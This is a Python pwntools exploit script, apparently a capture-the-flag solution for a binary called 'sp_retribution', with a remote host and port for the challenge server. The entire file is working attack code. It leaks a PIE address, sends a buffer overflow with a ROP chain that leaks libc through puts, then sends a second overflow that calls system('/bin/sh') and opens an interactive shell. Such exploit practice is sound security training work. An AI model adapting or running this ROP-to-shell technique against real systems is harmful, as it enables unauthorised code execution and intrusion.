#!/usr/bin/env python3

from pwn import *

the_binary = "./sp_retribution"
context.binary = the_binary
elf = context.binary
libc = ELF("./glibc/libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("206.189.31.119", 31704)
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        # ret before ROP
        pie break 0xaeb

        continue
    """)

io.sendlineafter(b">> ", b"2")
io.sendafter(b"y = ", b"A")
io.recvuntil(b"y = A")
raw_leak = b"A" + io.recvuntil(b"\n", drop=True)
elf_leak = u64(raw_leak.ljust(8, b"\x00"))
elf.address = elf_leak - 0xd41
log.info("ELF leak: %#x" % elf_leak)
log.info("ELF base: %#x" % elf.address)

class Gadgets:
    pop_rdi = elf.address + 0x0000000000000d33

rop = b""
rop += p64(Gadgets.pop_rdi)
rop += p64(elf.got.puts)
rop += p64(elf.plt.puts)
rop += p64(elf.sym.main)

payload = b"A"*88
payload += rop

assert len(payload) <= 0x84
io.sendafter(b"n): ", payload)

io.recvuntil(b"reset!\x1b[1;34m\n")
libc_leak = u64(io.recvuntil(b"\x7f").ljust(8, b"\x00"))
libc.address = libc_leak - libc.sym.puts
log.info("libc leak: %#x" % libc_leak)
log.info("libc base: %#x" % libc.address)

io.sendlineafter(b">> ", b"2")
io.sendafter(b"y = ", b"A")

rop = b""
rop += p64(Gadgets.pop_rdi)
rop += p64(next(libc.search(b"/bin/sh\x00")))
rop += p64(libc.sym.system)

payload = b"A"*88
payload += rop

assert len(payload) <= 0x84
io.sendafter(b"n): ", payload)

io.interactive()
